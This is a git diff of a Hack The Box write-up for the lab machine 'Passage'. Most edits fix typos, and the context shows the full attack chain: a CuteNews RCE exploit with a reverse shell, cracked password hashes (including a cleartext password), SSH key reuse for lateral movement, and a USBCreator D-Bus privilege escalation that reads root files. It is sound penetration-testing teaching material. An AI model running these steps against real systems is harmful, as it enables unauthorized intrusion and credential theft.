@@ -15,7 +15,7 @@ Hello everyone!
 
 The box of this week will be Passage, a medium-rated Linux box from Hack The Box created by [ChefByzen](https://www.hackthebox.eu/home/users/profile/140851). 
 
-Write-ups for Hack The Box are always posted as soon as machines get retired
+Write-ups for Hack The Box are always posted as soon as machines get retired.
 {: .notice--info}
 
 ## Enumeration
@@ -40,13 +40,13 @@ PORT   STATE SERVICE VERSION
 |_http-title: Passage News
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ 
 Nmap done: 1 IP address (1 host up) scanned in 10.65 seconds
 ```
 
 ### 80/TCP - HTTP Service
 
-Acessing the web page noticed that it is a blog built using **[CuteNews](http://cutephp.com/)** and the first post is very interesting, mentioning that Fail2Ban was recently implemented. This will prevent us from using any kind of brute force enumeration (dirbuster and related tools/techniques). 
+Accessing the web page noticed that it is a blog built using **[CuteNews](http://cutephp.com/)** and the first post is very interesting, mentioning that Fail2Ban was recently implemented. This will prevent us from using any kind of brute force enumeration (`dirbuster` and related tools/techniques). 
 
 ![image-20210225141945974](https://i.imgur.com/XLBq0J7.png){: .align-center}
 
@@ -73,7 +73,7 @@ After some research about the product, found the administration page at `http://
 
 ## Initial Foothold
 
-Checking existing exploits for this product version, found 4 alternatives in `searchsploit` where we used the last one, **48800** to which I also needed to make some adjustments. 
+Checking existing exploits for this product version, found 4 alternatives in `searchsploit` where I've used the last one, **48800**,  to which I also needed to make some adjustments.
 
 ```
 $ searchsploit cutenews 2.1.2
@@ -88,7 +88,7 @@ CuteNews 2.1.2 - Remote Code Execution                                | php/weba
 Shellcodes: No Results
 ```
 
-At first execution not only got a reverse shell but also a dump of all existing passwords
+At first execution not only got a reverse shell but also a dump of all password hashes
 
 ```
 $ python3 48800.py
@@ -138,7 +138,7 @@ Dropping to a SHELL
 command > 
 ```
 
-Cracking hashes using john found a password **atlanta1**, which belongs to user **paul**, figured out after some edits in the script to disclose this information, as seen below. 
+Cracking these hashes using john found a password **atlanta1**, which belongs to user **paul**, which I have discovered after some edits in the script to disclose this information, as seen below. 
 
 ```
 Enter the URL> http://passage.htb
@@ -178,7 +178,7 @@ After running `linpeas.sh` found some interesting information:
   Vulnerable!!
   ```
 
-  Besides having this vulnerability in place, when tried to exploit it like explained in [this link](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/) it didn't worked due to the required permissions and may work later with another account. 
+  Besides having this vulnerability in place, when tried to exploit it like explained in [this link](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/) it didn't worked due to lack of permissions, which will probably work with another user. 
 
   ```bash
   www-data@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/root.txt /tmp/somefilename true
@@ -186,7 +186,7 @@ After running `linpeas.sh` found some interesting information:
   (According to introspection data, you need to pass 'ssb')
   ```
 
-- Noted other 2 users in this box, where these were initially listed as e-mail addresses in the page and also for Paul we have a possible password already cracked
+- Noted other 2 users in this box, where these were initially listed as e-mail addresses in the page and Paul called us attention once this is a user to which we have already cracked a password.
 
   ```
   [+] Users with console
@@ -203,6 +203,7 @@ After running `linpeas.sh` found some interesting information:
   uid=1001(paul) gid=1001(paul) groups=1001(paul)
   ```
   
+
  First thing to test is Paul credentials, which worked successfully at first try and allowed us to get the user flag! :smile:
 
 ```
@@ -233,14 +234,13 @@ drwxr-x--- 16 paul paul 4096 Feb  5 06:30 ..
 Taking a closer look to `id_rsa.pub`, noticed that it was created by **nadav**. After seeing this I have immediately tried to ssh using the obtained private key as this user and luckily I had success on it! :smiley:
 
 ```bash
-$ cat id_rsa.pub                                                                                                                 
+$ cat id_rsa.pub
 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage
 
 $ ssh -i id_rsa nadav@10.10.10.206
 Last login: Thu Feb 25 13:41:27 2021 from 10.10.10.10
 nadav@passage:~$ id
 uid=1000(nadav) gid=1000(nadav) groups=1000(nadav),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
-nadav@passage:~$	
 ```
 Finally, now as **nadav**, gave another try to USBCreator vulnerability and this time we had success once we have all required permissions to execute it. 
 
@@ -252,7 +252,7 @@ nadav@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path 
 
 If you want to truly get root and an interactive shell there are some possibilities that we must try:
 
-- Obtain a copy of `/etc/shadow`, unshadow it and ckack the passwords using John or Hashcat, which didn't worked for me with the dictionaries used;
+- Obtain a copy of `/etc/shadow`, unshadow it and crack the passwords using John or Hashcat, which didn't worked for me with the dictionaries used;
 - Verify the existence of  `id_rsa` file inside root profile, as well as the presence of it in the **authorized_keys**, which was the option we had success as below and obtained the root flag:
 
 ```bash
